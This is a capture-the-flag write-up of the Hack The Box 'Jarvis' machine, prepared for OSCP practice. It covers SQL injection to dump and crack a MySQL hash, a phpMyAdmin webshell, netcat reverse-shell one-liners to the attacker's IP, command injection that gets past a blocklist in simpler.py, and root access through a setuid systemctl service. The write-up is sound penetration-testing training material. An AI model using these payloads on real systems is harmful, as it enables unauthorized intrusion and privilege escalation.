---
title: "Hack The Box - Jarvis"
date: 2020-02-07
tags: [oscp, htb, linux]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "SQLi and abusing systemctl"
picture: /assets/htb-jarvis/machine_info.png
author_profile: false
---

![](/assets/htb-jarvis/machine_info.png)

## Enumeration

Nmap scans show 3 ports open; 22 (SSH), 80 (HTTP), and 64999 (HTTP). 

```
Nmap scan report for 10.10.10.143
Host is up, received user-set (0.046s latency).
Scanned at 2020-02-03 11:46:33 EST for 76s
Not shown: 65532 closed ports
Reason: 65532 conn-refused
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzv4ZGiO8sDRbIsdZhchg+dZEot3z8++mrp9m0VjP6qxr70SwkE0VGu+GkH7vGapJQLMvjTLjyHojU/AcEm9MWTRWdpIrsUirgawwROic6HmdK2e0bVUZa8fNJIoyY1vPa4uNJRKZ+FNoT8qdl9kvG1NGdBl1+zoFbR9az0sgcNZJ1lZzZNnr7zv/Jghd/ZWjeiiVykomVRfSUCZe5qZ/aV6uVmBQ/mdqpXyxPIl1pG642C5j5K84su8CyoiSf0WJ2Vj8GLiKU3EXQzluQ8QJJPJTjj028yuLjDLrtugoFn43O6+IolMZZvGU9Man5Iy5OEWBay9Tn0UDSdjbSPi1X
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDW2OapO3Dq1CHlnKtWhDucQdl2yQNJA79qP0TDmZBR967hxE9ESMegRuGfQYq0brLSR8Xi6f3O8XL+3bbWbGQ=
|   256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuKufVSUgOG304mZjkK8IrZcAGMm76Rfmq2by7C0Nmo
80/tcp    open  http    syn-ack Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
64999/tcp open  http    syn-ack Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Navigating to the HTTP page on port 80 gives a website for the Stark Hotel. Our Gobuster scan on the site shows the following:

- `/phpmyadmin`
- `/nav.php`
- `/room.php`

Nikto also showed that the page `/phpmyadmin/ChangeLog` was present, which tells us that the version of phpMyAdmin running is 4.8.

If we navigate the site, we find that the `room.php` page has a parameter called `cod`, which seems to just list the room types numerically. Rolling through these numbers gives us 6 room types. 

![](/assets/htb-jarvis/rooms_cod1.png)

![](/assets/htb-jarvis/rooms_cod2.png)

However, once we get to number 7, we get a blank entry, indicating that the backend query probably couldn't find the entry for this type, and is just dumping a blank. Let's keep this in mind for later.

![](/assets/htb-jarvis/rooms_cod7.png)

On port 6499, we get a simple page stating:

```
Hey you have been banned for 90 seconds, don't be bad
```

However, if you look at the source of the page, it seems hard-coded, so it's just a troll. A followup directory search with several wordlists found nothing of interest.

---

## Initial Shell

### SQLi on `room.php`

Going back to the `room.php` paramater, we know that there are 6 room types, that will produce a valid entry. When we enter any number higher then 6 though, we get a blank page. In a properly coded application, I would expect some sort of error page, telling us that the room type is not valid, or something like that. Since we get nothing, let's try some SQLi techniques to see what we can find.

If we simply enter `/room.php?cod='`, we also get a blank entry. 

![](/assets/htb-jarvis/room_sqli_test.png)

From this, we can assume that the backend SQL query must be somehting like `select roomtype from rooms where id = numberhere`. This means we can maybe add our own additions to this query, to get the data we need.

For SQL injections like this, a `UNION` is our best bet, as it allows us to extend the query already in place, and call more data. We know that we can draw a blank page if we put in a parameter like `cod=9999`, so that should be our starting point. We also know that placing a single `'` for the parameter also results in a blank, which means the developer didn't close the query with a single quote.

Our SQL injection will be something like `cod=99999+union+select+1,2,3,4`. Note the URL encoding.

> I would strongly recommend using Burp Suite's Repeater tool for this, as it'll make modification and URL encoding of the injection easier. The `CTRL+U` command will URL encode a selection of text, and `CTRL+SHIFT+U` will unencode a selection of text.

We can assume that the query calls certain portions of the results that are shown. For example, price, photo, and name all probably have their own columns. So we need to estimate about how many columns we are calling in the query. Once we get the correct number of columns in place, we should be able to see where exactly those columns relate to.

Let's start with 5 columns, or `cod=99999+union+select+1,2,3,4,5`.

<a href="/assets/htb-jarvis/sqli_5col.png"><img src="/assets/htb-jarvis/sqli_5col.png" width="95%"></a>

Let's move to 6 columns, or `cod=99999+union+select+1,2,3,4,5,6`.

<a href="/assets/htb-jarvis/sqli_6col.png"><img src="/assets/htb-jarvis/sqli_6col.png" width="95%"></a>

...and 7 columns, or `cod=99999+union+select+1,2,3,4,5,6,7`?

<a href="/assets/htb-jarvis/sqli_7col.png"><img src="/assets/htb-jarvis/sqli_7col.png" width="95%"></a>

So we now get results back with 7 columns in the select statement. This means that the table we're pulling from has 7 columns. The numbers in the select statement relate to their position in the results. So for example, column 3 relates to the price, 5 is the rating, and 2 looks to be the room image. If you plug the full URL, plus the injection into a browser, you can see it easier.

![](/assets/htb-jarvis/sqli_browser.png)

### Pulling data via SQLi

Now that we've got a PoC for the SQLi, we can start pulling data from the database. A good starting point is the `select @@version` command, which will tell us the version of the DB server running, and helps us validate that we have code execution at the db level. The SQLi in this case would be `cod=99999+union+select+1,2,(select+%40%40version),4,5,6,7`. Again, note the URL encoding.

<a href="/assets/htb-jarvis/sqli_version.png"><img src="/assets/htb-jarvis/sqli_version.png" width="95%"></a>

It looks like we're looking at MariaDB, version 10.1.37. Let's keep grabbing data. [This resource is great](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) for MySQL enumeration.

If we run a query to find a list of databases in the `information_schema.schemata` table, we get no response, although we know there has to be data there.

SQL Query:

```sql
select schema_name FROM information_schema.schemata
```

URL-encoded Parameter:

```
cod=99999+union+select+"1","2",(select+schema_name+FROM+information_schema.schemata),"4","5","6","7"
```

<a href="/assets/htb-jarvis/schemata_blank.png"><img src="/assets/htb-jarvis/schemata_blank.png" width="95%"></a>

However, if we add the `LIMIT 1` clause to our query, we get a response of `hotel`. This is because we can currently only display one line at a time. The `LIMIT 1` query cuts our responses off at the first result, allowing it to be displayed.

SQL Query:

```sql
select schema_name FROM information_schema.schemata limit 1
```

URL-encoded Parameter:

```
cod=99999+union+select+"1","2",(select+schema_name+FROM+information_schema.schemata+limit+1),"4","5","6","7"
```

<a href="/assets/htb-jarvis/schemata_limit1.png"><img src="/assets/htb-jarvis/schemata_limit1.png" width="95%"></a>

We can get around this limitation by using the `GROUP_CONCAT()` function to display our results in a single line. 

SQL Query:

```sql
select group_concat(schema_name,":") FROM information_schema.schemata
```

URL-encoded Parameter:

```
cod=99999+union+select+"1","2",(select+group_concat(schema_name,"%3a")+FROM+information_schema.schemata),"4","5","6","7"
```

<a href="/assets/htb-jarvis/schemata_group_concat.png"><img src="/assets/htb-jarvis/schemata_group_concat.png" width="95%"></a>

Now that we have a way to return multiple items, we can try to pull usernames and password hashes from MySQL.

SQL Query:

```sql
SELECT group_concat(user,";",password,";") FROM mysql.user
```

URL-encoded Parameter:

```
cod=99999+union+select+"1","2",(SELECT+group_concat(user,"%3b",password,"%3b")+FROM+mysql.user),"4","5","6","7"
```

<a href="/assets/htb-jarvis/mysql_passwordhash.png"><img src="/assets/htb-jarvis/mysql_passwordhash.png" width="95%"></a>

This gives us a password hash of `2D2B7A5E4E637B8FBA1D17F40318F277D29964D0` for the `DBadmin` user. We can feed this hash into `hashcat` to crack it.

> The leading star in the hash can be ignored

Create a new file containing the hash with `echo "2D2B7A5E4E637B8FBA1D17F40318F277D29964D0" >> loot/dbadmin.hash`

### Cracking MySQL hash

Now that we have the hash locally, we can feed it to `hashcat` for cracking.

```bash
hashcat -m 300 loot/dbadmin.hash ~/wordlists/rockyou.txt --force
```

![](/assets/htb-jarvis/mysql_hash_cracked.png)

This gives us a password of `imissyou`.

### Create a webshell with PHPMyAdmin

With the `DBadmin` credentials in hand, we can log in to the `/phpmyadmin` panel. NOte that the username is case-sensitive here, so `dbadmin` won't work, but `DBadmin` will.

![](/assets/htb-jarvis/phpmyadmin_panel.png)

From here, we can manually run SQL queries in the SQL tab at the top. While there are known vulnerabilities for version 4.8.0 of PHPMyAdmin, there is an easier way to get a shell.

From the SQL tab, we can run the below command. This will output PHP code into a new PHP file on the machine, in the `/var/www/html` directory, making it available to run via the web. The `cmd` parameter we included will allow us to run system commands, and achieve RCE.


```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```

![](/assets/htb-jarvis/phpmyadmin_create_query.png)

![](/assets/htb-jarvis/phpmyadmin_query_created.png)

### Reverse Shell

Now that the file is created, ass we have to do is navigate a browser to `http://10.10.10.143/shell.php?cmd=whoami`. The `cmd` parameter can be changed to whatever system command we want. As shown below, we now have RCE on the server.

![](/assets/htb-jarvis/webshell_whoami.png)

We can now enumerate the box and find a way to get a reverse shell. We can see with the `which nc` command that netcat is present. So we'll need to give it a command to run a netcat reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 7500 >/tmp/f
```

To feed it to the web however, we should URL-encode it.

```
rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.15+7500+>/tmp/f
```

We'll also need a listener, which can be opened with `nc -lvnp 7500`.

Now we just feed the encoded string to the `cmd` parameter on the webshell.

![](/assets/htb-jarvis/initial_shell.png)

---

## Privilege Escalation

### Reading sudoers file

As always, one of our first enumeration steps should be to run `sudo -l` to see if the current user has any `sudo` permissions.

![](/assets/htb-jarvis/sudoers_wwwdata.png)

In this case, it seems we can run a python script called `simpler.py` as user `pepper`. If we navigate to the `/var/www/Admin-Utilities` directory, our command to run the program would be `sudo -u pepper ./simpler.py`.

### Exploiting `simpler.py`

We can copy `simpler.py` to our local machine, and see what it does.

```python
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()
	
    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1
	
    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
	
def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req
			
def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]
	
def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req
	
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

So it looks to be a tool to ping and list attackers. Probably related to the page we initially found on port 6499.

The interesting section for us is the `ping` function below:

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

So it seems that this function will kick off a `ping` command against the IP address we specify. But if we look at the command, we can see that the `os.system` call simply inserts whatever the `command` variable is, which we can control via our input to the program.

Also, notice the `forbidden` array at the top of the function. It limits us from using any of those characters, which incidentally happen to be commonly used for sequential commands. The function will exit the program and print a warning if any of those commands are used. So essentially, we can't simply do something like `ping -c 1 localhost && whoami`, as the function will flag on the `-` and `&&`.

What we can do though, is use `$()` to initiate commands. Our command would look something like `$(bash)`, which will simply open a new `bash` shell in place.

![](/assets/htb-jarvis/simpler_bash_noresponse.png)

Looks like this method won't work very well, as we get no response to our commands. Similarly, doing something like `$(nc -e /bin/sh 10.10.xx.xx 7600)` won't work, as there is a `-` in the command, so we'd get flagged.

What we can do though, is write our command to a file, and simply read the file as the command.

> Open a listener with `nc -lvnp 7600` before doing this.

```bash
echo 'nc 10.10.15.147 7600 -e /bin/bash' > /tmp/revshell.sh
chmod +x /tmp/revshell.sh
```

So breaking this down, we create the shell script containing the netcat reverse shell, and make it executable with `chmod +x`. When we run `simpler.py` again, we simply feed it the command to run the script, which is `$(/tmp/revshell.sh)`. This gives us our reverse shell back.

From here, we're running as `pepper`, so we can simply add our own SSH Public keys to `/home/pepper/.ssh/authorized_keys` to gain SSH access with `ssh pepper@10.10.10.143`.

![](/assets/htb-jarvis/ssh_pepper.png)

We can now grab `user.txt` directly form the home directory we're already in.

![](/assets/htb-jarvis/user_proof.png)

### Exploit `systemctl`

Part of enumeration of privilege escalation should always be too look for binaries with SETUID bit set. The command `find / -perm -4000 2> /dev/null` allows us to list them out easily.

![](/assets/htb-jarvis/systemctl_setuid.png)

In this case, it's strange that `/bin/systemctl` is set, as it normally runs in the context of the current user, not `root`. This will enable us to essentially make a service that will run a reverse shell, and execute it as `root`.

We need to create a file called `root.service` with the following contents:

```
[Service]
Type=oneshot
ExecStart=/bin/bash /tmp/revshell.sh
[Install]
WantedBy=multi-user.target
```

Notice how it's calling the `revshell.sh` script we created to exploit `simpler.py`. Since we're using SSH here, we can resuse it again.

> Start a listener with `nc -lvnp 7600`

Now to start the service, we just need to run `./systemctl enable /home/pepper/root.service --now`.

![](/assets/htb-jarvis/systemctl_enable_revshell.png)

Looking at our listener, we now have a root shell.

![](/assets/htb-jarvis/root_shell.png)

We can grab `root.txt` from `/root/root.txt`

![](/assets/htb-jarvis/root_proof.png)



